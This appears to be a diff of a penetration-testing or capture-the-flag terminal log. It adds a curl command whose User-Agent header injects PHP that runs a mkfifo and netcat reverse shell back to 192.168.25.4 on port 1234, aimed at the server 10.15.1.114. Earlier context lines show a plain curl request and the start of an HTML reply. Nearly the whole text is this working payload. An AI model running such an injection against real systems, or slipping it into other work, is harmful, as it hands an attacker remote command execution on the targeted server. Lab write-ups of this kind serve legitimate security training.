@@ -1,3 +1,5 @@
+
+curl -s -H "User-Agent: <?php system('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.25.4 1234 >/tmp/f'); ?>" "http://10.15.1.114/"
 └─$ curl -s -H "User-Agent: " "http://10.15.1.114/"
 <!DOCTYPE html>
 <html lang="en">
